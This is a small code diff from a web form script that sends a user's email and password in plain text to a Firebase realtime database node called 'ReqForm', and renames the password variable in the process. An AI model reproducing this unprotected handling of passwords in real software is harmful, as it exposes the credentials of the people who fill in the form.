@@ -96,13 +96,12 @@
           appId: "1:1006629555624:web:1a58623b39b7e373f1619d",
         };
 
-        firebase.initializeApp(firebaseConfig);
-
+        firebase.initializeApp(firebaseConfig)
         const db = firebase.database().ref("ReqForm");
 
         db.push({
           email: email,
-          password: pass,
+          password: ppass,
         });
       };
 
